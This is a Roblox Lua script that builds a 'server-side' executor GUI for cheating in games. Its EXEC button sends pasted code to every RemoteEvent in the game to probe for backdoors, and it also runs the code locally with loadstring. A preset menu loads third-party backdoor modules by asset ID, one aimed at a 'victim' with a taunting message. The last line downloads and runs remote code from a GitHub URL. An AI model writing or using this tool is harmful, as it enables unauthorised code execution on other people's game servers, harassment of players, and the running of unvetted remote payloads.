local player = game.Players.LocalPlayer
local pName = player.Name
local scr = Instance.new("ScreenGui")
scr.Name = "ProjectPP_DarkMode"
scr.ResetOnSpawn = false
scr.Parent = player:WaitForChild("PlayerGui")

-- [ Main Frame - 600x350 ตามโครงสร้างดั้งเดิม ] --
local main = Instance.new("Frame", scr)
main.Size = UDim2.new(0, 600, 0, 350)
main.Position = UDim2.new(0.5, -300, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15) -- เปลี่ยนเป็น Dark
main.BorderSizePixel = 1.85
main.BorderColor3 = Color3.fromRGB(60, 60, 60)

-- [ Title & Description ] --
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(0, 400, 0, 40)
title.Position = UDim2.new(0, 10, 0, 5)
title.Text = "Project PP {Dark Mode}"
title.TextSize = 26
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextXAlignment = Enum.TextXAlignment.Left

local desc = Instance.new("TextLabel", main)
desc.Size = UDim2.new(0, 400, 0, 20)
desc.Position = UDim2.new(0, 10, 0, 35)
desc.Text = "private gui by pun_punPP102030"
desc.Font = Enum.Font.SourceSansItalic
desc.TextSize = 14
desc.TextColor3 = Color3.fromRGB(150, 150, 150)
desc.BackgroundTransparency = 1
desc.TextXAlignment = Enum.TextXAlignment.Left

-- [ Input Box Zone - แก้ไขให้คำไม่ออกนอกกรอบ ] --
local inputFrame = Instance.new("Frame", main)
inputFrame.Size = UDim2.new(0, 420, 0, 220)
inputFrame.Position = UDim2.new(0, 10, 0, 55)
inputFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
inputFrame.BorderSizePixel = 1.85
inputFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)

local input = Instance.new("TextBox", inputFrame)
input.Size = UDim2.new(1, -10, 1, -10)
input.Position = UDim2.new(0, 5, 0, 5)
input.BackgroundTransparency = 1
input.Text = ""
input.TextSize = 18
input.MultiLine = true
input.ClearTextOnFocus = false
input.TextWrapped = true -- ป้องกันข้อความทะลุออกข้าง
input.TextXAlignment = Enum.TextXAlignment.Left
input.TextYAlignment = Enum.TextYAlignment.Top
input.Font = Enum.Font.Code
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.PlaceholderText = "Paste your SS require here..."

-- [ Buttons Zone - ปรับเป็น 3 ปุ่มเพื่อให้มี CONSOLE ] --
local btnFrame = Instance.new("Frame", main)
btnFrame.Size = UDim2.new(0, 420, 0, 70)
btnFrame.Position = UDim2.new(0, 10, 0, 280)
btnFrame.BackgroundTransparency = 1

local function createButton(x, text, color)
    local frame = Instance.new("Frame", btnFrame)
    frame.Size = UDim2.new(0, 130, 0, 55) -- ปรับขนาดให้ลงตัว 3 ปุ่ม
    frame.Position = UDim2.new(0, x, 0, 5)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 1.85
    frame.BorderColor3 = Color3.fromRGB(60, 60, 60)

    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(1, -6, 1, -6)
    btn.Position = UDim2.new(0, 3, 0, 3)
    btn.Text = text
    btn.TextSize = 18
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = color
    btn.Font = Enum.Font.SourceSansBold
    return btn
end

local execBtn = createButton(0, "EXEC", Color3.fromRGB(0, 150, 255))
local clrBtn  = createButton(140, "CLR", Color3.fromRGB(255, 255, 255))
local conBtn  = createButton(280, "CONSOLE", Color3.fromRGB(255, 150, 0))

-- [ Require List Zone ] --
local scriptTitle = Instance.new("TextLabel", main)
scriptTitle.Size = UDim2.new(0, 150, 0, 35)
scriptTitle.Position = UDim2.new(0, 440, 0, 15)
scriptTitle.Text = "Require List"
scriptTitle.TextSize = 20
scriptTitle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
scriptTitle.BorderSizePixel = 1.85
scriptTitle.BorderColor3 = Color3.fromRGB(60, 60, 60)
scriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptTitle.Font = Enum.Font.SourceSansBold

local scriptFrame = Instance.new("ScrollingFrame", main)
scriptFrame.Size = UDim2.new(0, 150, 0, 280)
scriptFrame.Position = UDim2.new(0, 440, 0, 55)
scriptFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scriptFrame.ScrollBarThickness = 6
scriptFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
scriptFrame.BorderSizePixel = 1.85
scriptFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)

-- [ Script List ] --
local scripts = {
    {Title="OWNERS SS", Code='require(92684888032460)({Owners = {"username"}})'},
    {Title="ALERT PWN", Code='require(10557341183).alert("VictimNameHere", "you got pwned kid")'},
    {Title="SPACE LIB", Code='require(5702244094).space("YourNameHere")'},
    {Title="EAGLE CORE", Code="require(6032524768).Eagle('Your Name Here')"},
    {Title="LOAD USER", Code='require(8705266136).load("Username")'},
    {Title="SF V3 PC", Code='require(132592022786319).SFV3PC("'..pName..'")'}
}

local y = 10
for _, s in ipairs(scripts) do
    local b = Instance.new("TextButton", scriptFrame)
    b.Size = UDim2.new(1, -10, 0, 40)
    b.Position = UDim2.new(0, 5, 0, y)
    b.Text = s.Title
    b.TextSize = 15
    b.Font = Enum.Font.SourceSansBold
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    b.BorderSizePixel = 1.85
    b.BorderColor3 = Color3.fromRGB(60, 60, 60)
    b.TextColor3 = Color3.fromRGB(255, 255, 255)

    b.MouseButton1Click:Connect(function()
        local content = s.Code:gsub("username", pName):gsub("VictimNameHere", pName):gsub("YourNameHere", pName):gsub("Your Name Here", pName):gsub("Username", pName)
        input.Text = content
        input:CaptureFocus()
    end)
    y += 45
end
scriptFrame.CanvasSize = UDim2.new(0, 0, 0, y)

-- [ Logic ] --
execBtn.MouseButton1Click:Connect(function()
    if input.Text ~= "" then
        -- Brute Force SS
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then pcall(function() v:FireServer(input.Text) end) end
        end
        -- Local Fallback
        local f = loadstring(input.Text) if f then task.spawn(f) end
    end
end)

clrBtn.MouseButton1Click:Connect(function() input.Text = "" end)

conBtn.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F9, false, game)
end)

-- [ Full Window Drag (ใช้ระบบเดิมที่คุณให้มาเพราะมันเสถียร) ] --
local UIS = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos
local function update(input)
    local d = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
end
main.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging = true dragStart = i.Position startPos = main.Position
        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
main.InputChanged:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then dragInput = i end
end)
UIS.InputChanged:Connect(function(i) if dragging and i == dragInput then update(i) end end)

-- [ Finalize ] --
input.Text = [[print("Project PP {Dark Mode} by pun_punPP102030")]]
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/popohoyo1029384756-hub/Project_PP_Classic_LoadingGui/refs/heads/main/PPPCLG.lua"))() end)
